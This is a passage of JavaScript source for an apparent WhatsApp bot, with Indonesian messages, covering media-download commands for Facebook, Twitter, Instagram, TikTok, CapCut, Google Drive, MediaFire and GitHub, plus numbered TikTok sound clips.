*Image Url:* ${v.imageSrc}
*Title:* ${v.title}
*Alternate Titles:* ${v.subtitle}
*Update:* ${v.update}
*Chapters:* ${v.chapters}
*Link:* ${v.link}
   `.trim()
					}).filter(v => v).join("\n\n________________________\n\n")
					await m.reply(teks)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break;
			case 'fbdl':
			case 'facebook':
			case 'fb': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Masukan Link Nya!!!`)
				if (!isUrl(args[0])) return m.warning(`Apakah Itu Terlihat Seperti Link?`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await snapsave(text)
					vreden.sendMessage(m.chat, {
						video: {
							url: anu.links["Download High Quality"]
						},
						caption: '*SnapSave Facebook 🚀*'
					}, {
						quoted: m
					})
				} catch (error) {
					try {
						let anu = await snapsavev2(text)
						vreden.sendMessage(m.chat, {
							video: {
								url: anu.result[0].url
							},
							caption: '*SaveFrom Facebook 🚀*'
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'fb2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *url*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await snapsavev2(text)
					vreden.sendMessage(m.chat, {
						video: {
							url: anu.result[0].url
						},
						caption: '*[ V2 ]* Facebook ✅'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'twitter':
			case 'twittdl':
			case 'twdl': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *url*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let twitter = await twiterdl(text)
					let buffer = await getBuffer(twitter.data.downloads[1].url)
					await vreden.sendMessage(m.chat, {
						video: buffer,
						caption: `*Twitter Downloader🚀*\n`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'capcut': {
				if (usersdb[m.sender].limit < 1) return m.reply(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.capcut.net/sharevideo?template_id=7239111787965205762&language=in&region=ID`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await capcutdl(text)
					vreden.sendMessage(m.chat, {
						video: {
							url: `https://ssscap.net${anu.originalVideoUrl}`
						},
						caption: `*${anu.title}*\n\n- Desk: ${anu.description}\n- Digunakan: ${anu.usage}\n`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'igstory':
			case 'igs':
			case 'instagramstory':
			case 'instastory':
			case 'igslide':
			case 'igphoto':
			case 'instaphoto':
			case 'instafoto':
			case 'igfoto':
			case 'instagram':
			case 'ig':
			case 'igdl':
			case 'igvideo':
			case 'instavideo':
			case 'instavid':
			case 'igreels':
			case 'instareels':
			case 'instareel':
			case 'igtv':
			case 'instatv': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/igdownload?url=${text}`)
					let c = 0
					for (let gom of anu.result.response.data) {
						if (gom.type == 'video') await vreden.sendMessage(m.chat, {
							video: {
								url: gom.url
							},
							caption: `*Instagram Video 🚀*`
						}, {
							quoted: m
						})
						if (gom.type == 'image') {
							if (c == 0) await vreden.sendMessage(m.chat, {
								image: {
									url: gom.url
								},
								caption: `*Instagram Photo🚀*\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
							}, {
								quoted: m
							})
							else await vreden.sendMessage(m.sender, {
								image: {
									url: gom.url
								}
							}, {
								quoted: m
							})
							c += 1
						}
					}
				} catch (error) {
					try {
						let anu = await igdown(text)
						let c = 0
						for (let gom of anu.data) {
							if (gom.type == 'video') await vreden.sendMessage(m.chat, {
								video: {
									url: gom.url
								},
								caption: `*[ V2 ]* Done Bangg ✅`
							}, {
								quoted: m
							})
							if (gom.type == 'image') {
								if (c == 0) await vreden.sendMessage(m.chat, {
									image: {
										url: gom.url
									},
									caption: `*[ V2 ]* IG Photo ✅\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
								}, {
									quoted: m
								})
								else await vreden.sendMessage(m.sender, {
									image: {
										url: gom.url
									}
								}, {
									quoted: m
								})
								c += 1
							}
						}
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'igstory2':
			case 'igs2':
			case 'instagramstory2':
			case 'instastory2':
			case 'igslide2':
			case 'igphoto2':
			case 'instaphoto2':
			case 'instafoto2':
			case 'igfoto2':
			case 'instagram2':
			case 'ig2':
			case 'igdl2':
			case 'igvideo2':
			case 'instavideo2':
			case 'instavid2':
			case 'igreels2':
			case 'instareels2':
			case 'instareel2':
			case 'igtv2':
			case 'instatv2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *url*`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/igdownload?url=${text}`)
					let c = 0
					for (let gom of anu.result.response.data) {
						if (gom.type == 'video') await vreden.sendMessage(m.chat, {
							video: {
								url: gom.url
							},
							caption: `*ClipDown Video💫*`
						}, {
							quoted: m
						})
						if (gom.type == 'image') {
							if (c == 0) await vreden.sendMessage(m.chat, {
								image: {
									url: gom.url
								},
								caption: `*ClipDown Photo💫*\n\n${m.isGroup ? '_Sisa Foto Dikirim Di Private Chat_' : ""}`
							}, {
								quoted: m
							})
							else await vreden.sendMessage(m.sender, {
								image: {
									url: gom.url
								}
							}, {
								quoted: m
							})
							c += 1
						}
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'scrol':
			case 'carvid': {
				if (!isCreator && !isPremium) return m.tolak(mess.OnlyPrem)
				if (!text) return m.warning(`*[ ! ]* *Command Anda Salah*\n*Example ${prefix + command} Resah Jadi Luka*`)
				try {
					let serach = await tiktokSearchVideo(text)
					let json = await pickRandom(serach.videos)
					let cap = `${json.title}`
					let button = [{

						"name": "quick_reply",

						"buttonParamsJson": `{\"display_text\":\"Scroll\",\"id\":\"${prefix + command} ${text}\"}`

					}]
					vreden.sendButtonVideo(m.chat, {
						url: `https://tikwm.com${json.play}`
					}, button, cap, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tiktoksearch':
			case 'tiktoks':
			case 'ttsearch': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let serach = await tiktokSearchVideo(text)
					let tiktoklist = []
					let teks = `${serach.videos[0].title}\n\n*⌬ Video ID* : ${serach.videos[0].video_id}\n*⌬ Username* : ${serach.videos[0].author.unique_id}\n*⌬ Nickname* : ${serach.videos[0].author.nickname}\n*⌬ Duration* : ${serach.videos[0].duration} detik\n*⌬ VT Like* : ${serach.videos[0].digg_count}\n*⌬ Comment* : ${serach.videos[0].comment_count}\n*⌬ Share* : ${serach.videos[0].share_count}\n\n`
					let no = 1
					for (let i of serach.videos) {
						tiktoklist.push({
							title: `${no++}. ${i.title}`,
							rows: [{
									header: `[ ${i.duration} detik ] Download Audio | ${i.author.nickname}`,
									title: `ID: ${i.video_id}\n⌬ VT Like : ${i.digg_count}\n⌬ Comment : ${i.comment_count}\n⌬ Share : ${i.share_count}`,
									description: `Link: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}`,
									id: `.ttaudio https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}`,
								},
								{
									header: `[ ${i.duration} detik ] Download Video | ${i.author.unique_id}`,
									title: `ID: ${i.video_id}\n*⌬ VT Like* : ${i.digg_count}\n*⌬ Comment* : ${i.comment_count}\n⌬ Share : ${i.share_count}`,
									description: `Link: https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}`,
									id: `.tiktok https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}`,
								}
							]
						})
					}
					let button = [{
						"name": "single_select",
						"buttonParamsJson": `{\n  title: 'Search 🔎',\n  sections: ${JSON.stringify(tiktoklist)}\n}`
					}]
					vreden.sendButtonVideo(m.chat, {
						url: `https://tikwm.com${serach.videos[0].play}`
					}, button, teks, footer, m)
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tiktoksearch2':
			case 'tiktoks2':
			case 'ttsearch2': {
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let serach = await tiktokSearchVideo(text)
					let teks = '*TikTok Search*\n\n\nketik *ttget* untuk mengambil video\ngunakan dengan nomor urutan, contoh *ttget 1*\n\n'
					let no = 1
					for (let i of serach.videos) {
						let sut = await JSON.stringify(i.author)
						teks += `*⭔ No Urutan* : ${no++}\n*⭔ Title* : ${i.title}\n*⭔ Video ID* : ${i.video_id}\n*⭔ Username* : ${i.author.unique_id}\n*⭔ Nickname* : ${i.author.nickname}\n*⭔ Duration* : ${i.duration} detik\n*⭔ VT Like* : ${i.digg_count}\n*⭔ Comment* : ${i.comment_count}\n*⭔ Share* : ${i.share_count}\n*⭔ Url* : https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}\n─────────────────\n`
					}
					vreden.sendMessage(m.chat, {
						video: {
							url: `https://tikwm.com${serach.videos[0].play}`
						},
						caption: teks
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ttget': {
				if (!text) return m.warning(`Contoh : ${prefix + command} 1`)
				if (!m.quoted) return m.reply('Reply Pesan Dari Bot!')
				let urls = quoted.text.match(new RegExp(/(http(?:s)?:\/\/)?(?:www\.)?(?:tiktok\.com\/@[^\/]+\/video\/(\d+))|(http(?:s)?:\/\/)?vm\.tiktok\.com\/([^\s&]+)|(http(?:s)?:\/\/)?vt\.tiktok\.com\/([^\s&]+)/, 'gi'))
				if (!urls) return m.warning(`Mungkin pesan yang anda reply tidak mengandung result tiktok search`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${urls[text - 1]}`)
					let c = 0
					for (let imgs of anu.result.data) {
						if (imgs.type == "nowatermark") {
							vreden.sendMessage(m.chat, {
								video: {
									url: imgs.url
								},
								caption: `*Video Info* :
- Region : ${anu.result.region}
- Duration : ${anu.result.duration}
- Taken : ${anu.result.taken_at}

*Statistik Info* :
- Views : ${anu.result.stats.views}
- Likes : ${anu.result.stats.likes}
- Comment : ${anu.result.stats.comment}
- Share : ${anu.result.stats.share}
- Download : ${anu.result.stats.download}

*Author Info* :
- Fullname : ${anu.result.author.fullname}
- Nickname : ${anu.result.author.nickname}

*Music Info* :
- Title : ${anu.result.music_info.title}
- Author : ${anu.result.music_info.author}
- Album : ${anu.result.music_info.album}

*Caption* :
${anu.result.title}
`
							}, {
								quoted: m
							})
						} else if (imgs.type == "photo") {
							if (c == 0) await vreden.sendMessage(m.chat, {
								image: {
									url: imgs.url
								},
								caption: `*Photo Info* :
- Region : ${anu.result.region}
- Duration : ${anu.result.duration}
- Taken : ${anu.result.taken_at}

*Statistik Info* :
- Views : ${anu.result.stats.views}
- Likes : ${anu.result.stats.likes}
- Comment : ${anu.result.stats.comment}
- Share : ${anu.result.stats.share}
- Download : ${anu.result.stats.download}

*Author Info* :
- Fullname : ${anu.result.author.fullname}
- Nickname : ${anu.result.author.nickname}

*Music Info* :
- Title : ${anu.result.music_info.title}
- Author : ${anu.result.music_info.author}
- Album : ${anu.result.music_info.album}

*Caption* :
${anu.result.title}
${m.isGroup ? anu.result.data.length > 1 ? "\n_Sisa foto dikirim ke private chat_\n" : "\n" : "\n"}`
							}, {
								quoted: m
							})
							else await vreden.sendMessage(m.sender, {
								image: {
									url: imgs.url
								}
							}, {
								quoted: m
							})
							c += 1
							await sleep(2000)
						}
					}
				} catch (error) {
					try {
						const data = await tiktokdl(urls[text - 1])
						console.log(data)
						vreden.sendMessage(m.chat, {
							video: {
								url: data.video
							},
							caption: `*[ V3 ]* Done boss ✅`
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'ttslide':
			case 'tiktokfoto':
			case 'tiktokmp4':
			case 'tt':
			case 'ttnowm':
			case 'tiktoknowm':
			case 'tiktok': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
					let c = 0
					for (let imgs of anu.result.data) {
						if (imgs.type == "nowatermark") {
							vreden.sendMessage(m.chat, {
								video: {
									url: imgs.url
								},
								caption: `*Video Info* :
- Region : ${anu.result.region}
- Duration : ${anu.result.duration}
- Taken : ${anu.result.taken_at}

*Statistik Info* :
- Views : ${anu.result.stats.views}
- Likes : ${anu.result.stats.likes}
- Comment : ${anu.result.stats.comment}
- Share : ${anu.result.stats.share}
- Download : ${anu.result.stats.download}

*Author Info* :
- Fullname : ${anu.result.author.fullname}
- Nickname : ${anu.result.author.nickname}

*Music Info* :
- Title : ${anu.result.music_info.title}
- Author : ${anu.result.music_info.author}
- Album : ${anu.result.music_info.album}

*Caption* :
${anu.result.title}
`
							}, {
								quoted: m
							})
						}
						if (imgs.type == "photo") {
							if (c == 0) await vreden.sendMessage(m.chat, {
								image: {
									url: imgs.url
								},
								caption: `*Photo Info* :
- Region : ${anu.result.region}
- Duration : ${anu.result.duration}
- Taken : ${anu.result.taken_at}

*Statistik Info* :
- Views : ${anu.result.stats.views}
- Likes : ${anu.result.stats.likes}
- Comment : ${anu.result.stats.comment}
- Share : ${anu.result.stats.share}
- Download : ${anu.result.stats.download}

*Author Info* :
- Fullname : ${anu.result.author.fullname}
- Nickname : ${anu.result.author.nickname}

*Music Info* :
- Title : ${anu.result.music_info.title}
- Author : ${anu.result.music_info.author}
- Album : ${anu.result.music_info.album}

*Caption* :
${anu.result.title}
${m.isGroup ? anu.result.data.length > 1 ? "\n_Sisa foto dikirim ke private chat_\n" : "\n" : "\n"}`
							}, {
								quoted: m
							})
							else await vreden.sendMessage(m.sender, {
								image: {
									url: imgs.url
								}
							}, {
								quoted: m
							})
							c += 1
							await sleep(2000)
						}
					}
				} catch (error) {
					console.log(error)
					try {
						const data = await tiktokdl(text)
						console.log(data)
						vreden.sendMessage(m.chat, {
							video: {
								url: data.video
							},
							caption: `*[ V4 ]* Done boss ✅`
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'tiktok2':
			case 'tt2':
			case 'ttnowm2':
			case 'tiktokmp42': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
					let c = 0
					for (let imgs of anu.result.data) {
						if (imgs.type == "nowatermark") {
							vreden.sendMessage(m.chat, {
								video: {
									url: imgs.url
								},
								caption: `*Video Info* :
- Region : ${anu.result.region}
- Duration : ${anu.result.duration}
- Taken : ${anu.result.taken_at}

*Statistik Info* :
- Views : ${anu.result.stats.views}
- Likes : ${anu.result.stats.likes}
- Comment : ${anu.result.stats.comment}
- Share : ${anu.result.stats.share}
- Download : ${anu.result.stats.download}

*Author Info* :
- Fullname : ${anu.result.author.fullname}
- Nickname : ${anu.result.author.nickname}

*Music Info* :
- Title : ${anu.result.music_info.title}
- Author : ${anu.result.music_info.author}
- Album : ${anu.result.music_info.album}

*Caption* :
${anu.result.title}
`
							}, {
								quoted: m
							})
						} else if (imgs.type == "photo") {
							if (c == 0) await vreden.sendMessage(m.chat, {
								image: {
									url: imgs.url
								},
								caption: `*Photo Info* :
- Region : ${anu.result.region}
- Duration : ${anu.result.duration}
- Taken : ${anu.result.taken_at}

*Statistik Info* :
- Views : ${anu.result.stats.views}
- Likes : ${anu.result.stats.likes}
- Comment : ${anu.result.stats.comment}
- Share : ${anu.result.stats.share}
- Download : ${anu.result.stats.download}

*Author Info* :
- Fullname : ${anu.result.author.fullname}
- Nickname : ${anu.result.author.nickname}

*Music Info* :
- Title : ${anu.result.music_info.title}
- Author : ${anu.result.music_info.author}
- Album : ${anu.result.music_info.album}

*Caption* :
${anu.result.title}
${m.isGroup ? anu.result.data.length > 1 ? "\n_Sisa foto dikirim ke private chat_\n" : "\n" : "\n"}`
							}, {
								quoted: m
							})
							else await vreden.sendMessage(m.sender, {
								image: {
									url: imgs.url
								}
							}, {
								quoted: m
							})
							c += 1
							await sleep(2000)
						}
					}
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tiktok3':
			case 'tt3':
			case 'ttnowm3':
			case 'tiktokmp43': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const data = await tiktokdl(text)
					console.log(data)
					vreden.sendMessage(m.chat, {
						video: {
							url: data.video
						},
						caption: `Done boss ✅`
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'ttaudio':
			case 'tiktokmp3':
			case 'ttmp3':
			case 'tiktokaudio': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
					let audio = anu.result.music_info.url
					vreden.sendMessage(m.chat, {
						audio: {
							url: audio
						},
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					try {
						const data = await tiktokdl(text)
						vreden.sendMessage(m.chat, {
							audio: {
								url: data.music
							},
							mimetype: 'audio/mpeg'
						}, {
							quoted: m
						})
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'tiktokmp32':
			case 'ttmp32':
			case 'tiktokaudio2': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let anu = await fetchJson(`https://api.vreden.my.id/api/tiktok?url=${text}`)
					let audio = anu.result.music_info.url
					vreden.sendMessage(m.chat, {
						audio: {
							url: audio
						},
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'tiktokmp33':
			case 'ttmp33':
			case 'tiktokaudio3': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					const data = await tiktokdl(text)
					console.log(data)
					vreden.sendMessage(m.chat, {
						audio: {
							url: data.music
						},
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'gddl':
			case 'gdrivedl':
			case 'gdrive': {
				if (usersdb[m.sender].limit < 1) return m.warning(`Limit pemakaian tercapai, chat pemilik bot agar mendapatkan limit kembali\n\n${ownnomor}`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix + command} *url*`)
				if (!text.includes('drive')) return m.warning(mess.error.Iv)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let res = await GDriveDl(text)
					if (res.error) return m.reply("Link Invalid!")
					vreden.sendMessage(m.chat, {
						document: {
							url: res.downloadUrl
						},
						mimetype: res.mimetype,
						fileName: res.fileName,
						caption: `*</> GOOGLE DRIVE </>*

*Nama:* ${res.fileName}
*Size:* ${res.fileSize}
*Type:* ${res.mimetype}
`,
						contextInfo: {
							mentionedJid: [m.sender],
							externalAdReply: {
								title: `Google Drive🚀`,
								previewType: "PHOTO",
								thumbnailUrl: `https://pomf2.lain.la/f/e0flxz5u.png`,
								sourceUrl: text
							}
						}
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'mediafire':
			case 'mfire':
			case 'mfdl': {
				if (usersdb[m.sender].limit < 1) return m.tolak(`Limit kamu sudah habis silahkan kirim ${prefix} limit untuk mengecek limit`)
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*`)
				if (!isUrl(text)) return m.warning(mess.error.Iv)
				if (!text.includes('mediafire.com')) return m.warning(mess.error.Iv)
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					var data = await mediafireDl(text)
					fileNama = decodeURIComponent(data[0].nama)
					var media = await getBuffer(data[0].link)
					if (data[0].mime.includes('mp4')) {
						vreden.sendMessage(m.chat, {
							document: media,
							fileName: fileNama,
							mimetype: 'video/mp4',
							caption: `*</> MEDIAFIRE DOWN </>*

*Name* : ${data[0].nama}
*Size* : ${data[0].size}
*Jenis* : ${data[0].mime}
`
						}, {
							quoted: m
						})
					} else if (data[0].mime.includes('mp3')) {
						vreden.sendMessage(m.chat, {
							document: media,
							fileName: fileNama,
							mimetype: 'audio/mp3'
						}, {
							quoted: m
						})
					} else {
						vreden.sendMessage(m.chat, {
							document: media,
							fileName: fileNama,
							mimetype: 'application/' + data[0].mime,
							caption: `*</> MEDIAFIRE DOWN </>*

*Name* : ${data[0].nama}
*Size* : ${data[0].size}
*Jenis* : ${data[0].mime}
`,
							contextInfo: {
								mentionedJid: [m.sender],
								externalAdReply: {
									title: `MediaFire🔥`,
									previewType: "PHOTO",
									thumbnailUrl: `https://pomf2.lain.la/f/jgb2lgdx.jpg`,
									sourceUrl: text
								}
							}
						}, {
							quoted: m
						})
					}
				} catch (error) {
					try {
						var {
							result
						} = await fetchJson(`https://api.vreden.my.id/api/mediafiredl?url=${text}`)
						fileNama = decodeURIComponent(result[0].nama)
						var media = await getBuffer(result[0].link)
						if (result[0].mime.includes('mp4')) {
							vreden.sendMessage(m.chat, {
								document: media,
								fileName: fileNama,
								mimetype: 'video/mp4'
							}, {
								quoted: m
							})
						} else if (result[0].mime.includes('mp3')) {
							vreden.sendMessage(m.chat, {
								document: media,
								fileName: fileNama,
								mimetype: 'audio/mp3'
							}, {
								quoted: m
							})
						} else {
							vreden.sendMessage(m.chat, {
								document: media,
								fileName: fileNama,
								mimetype: 'application/' + result[0].mime
							}, {
								quoted: m
							})
						}
					} catch (error) {
						await m.errorReport(util.format(error), command)
					}
				}
			}
			break
			case 'gitclone': {
				let regx = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
				if (!text) return m.warning(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://github.com/`)
				if (!regx.test(text)) return m.warning('Linknya salah')
				await vreden.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let [, usr, repo] = text.match(regx) || []
					let repos = repo.replace(/.git$/, '')
					let hasdl = `https://api.github.com/repos/${usr}/${repos}/zipball`
					let namafile = (await fetch(hasdl, {
						method: 'HEAD'
					})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
					vreden.sendMessage(m.chat, {
						document: {
							url: hasdl
						},
						mimetype: 'application/zip',
						fileName: namafile
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			case 'sound1':
			case 'sound2':
			case 'sound3':
			case 'sound4':
			case 'sound5':
			case 'sound6':
			case 'sound7':
			case 'sound8':
			case 'sound9':
			case 'sound10':
			case 'sound11':
			case 'sound12':
			case 'sound13':
			case 'sound14':
			case 'sound15':
			case 'sound16':
			case 'sound17':
			case 'sound18':
			case 'sound19':
			case 'sound20':
			case 'sound21':
			case 'sound22':
			case 'sound23':
			case 'sound24':
			case 'sound25':
			case 'sound26':
			case 'sound27':
			case 'sound28':
			case 'sound29':
			case 'sound30':
			case 'sound31':
			case 'sound32':
			case 'sound33':
			case 'sound34':
			case 'sound35':
			case 'sound36':
			case 'sound37':
			case 'sound38':
			case 'sound39':
			case 'sound40':
			case 'sound41':
			case 'sound42':
			case 'sound43':
			case 'sound44':
			case 'sound45':
			case 'sound46':
			case 'sound47':
			case 'sound48':
			case 'sound49':
			case 'sound50':
			case 'sound51':
			case 'sound52':
			case 'sound53':
			case 'sound54':
			case 'sound55':
			case 'sound56':
			case 'sound57':
			case 'sound58':
			case 'sound59':
			case 'sound60':
			case 'sound61':
			case 'sound62':
			case 'sound63':
			case 'sound64':
			case 'sound65':
			case 'sound66':
			case 'sound67':
			case 'sound68':
			case 'sound69':
			case 'sound70':
			case 'sound71':
			case 'sound72':
			case 'sound73':
			case 'sound74':
			case 'sound75':
			case 'sound76':
			case 'sound77':
			case 'sound78':
			case 'sound79':
			case 'sound80':
			case 'sound81':
			case 'sound82':
			case 'sound83':
			case 'sound84':
			case 'sound85':
			case 'sound86':
			case 'sound87':
			case 'sound88':
			case 'sound89':
			case 'sound90':
			case 'sound91':
			case 'sound92':
			case 'sound93':
			case 'sound94':
			case 'sound95':
			case 'sound96':
			case 'sound97':
			case 'sound98':
			case 'sound99':
			case 'sound100':
			case 'sound101':
			case 'sound102':
			case 'sound103':
			case 'sound104':
			case 'sound105':
			case 'sound106':
			case 'sound107':
			case 'sound108':
			case 'sound109':
			case 'sound110':
			case 'sound111':
			case 'sound112':
			case 'sound113':
			case 'sound114':
			case 'sound115':
			case 'sound116':
			case 'sound117':
			case 'sound118':
			case 'sound119':
			case 'sound120':
			case 'sound121':
			case 'sound122':
			case 'sound123':
			case 'sound124':
			case 'sound125':
			case 'sound126':
			case 'sound127':
			case 'sound128':
			case 'sound129':
			case 'sound130':
			case 'sound131':
			case 'sound132':
			case 'sound133':
			case 'sound134':
			case 'sound135':
			case 'sound136':
			case 'sound137':
			case 'sound138':
			case 'sound139':
			case 'sound140':
			case 'sound141':
			case 'sound142':
			case 'sound143':
			case 'sound144':
			case 'sound145':
			case 'sound146':
			case 'sound147':
			case 'sound148':
			case 'sound149':
			case 'sound150':
			case 'sound151':
			case 'sound152':
			case 'sound153':
			case 'sound154':
			case 'sound155':
			case 'sound156':
			case 'sound157':
			case 'sound158':
			case 'sound159':
			case 'sound160':
			case 'sound161': {
				try {
					let link = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
					await vreden.sendMessage(m.chat, {
						audio: {
							url: link
						},
						mimetype: 'audio/mpeg'
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			// Group Menu
